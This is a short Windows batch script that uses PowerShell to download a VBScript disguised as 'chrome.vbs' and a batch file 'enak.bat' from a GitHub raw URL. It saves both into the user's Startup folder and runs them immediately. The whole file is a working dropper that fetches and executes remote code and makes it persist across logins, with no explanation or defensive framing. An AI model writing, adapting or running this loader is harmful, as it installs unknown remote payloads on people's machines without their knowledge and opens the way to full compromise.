@echo off
setlocal enabledelayedexpansion

:: Define URLs
set "vbsUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/chrome.vbs"
set "batUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/enak.bat"

:: Define paths
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "vbsFile=%startupFolder%\chrome.vbs"
set "batFile=%startupFolder%\enak.bat"

:: Download files using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%vbsUrl%' -OutFile '%vbsFile%'"
powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'"

:: Run both files
start "" "%vbsFile%"
start "" "%batFile%"

exit
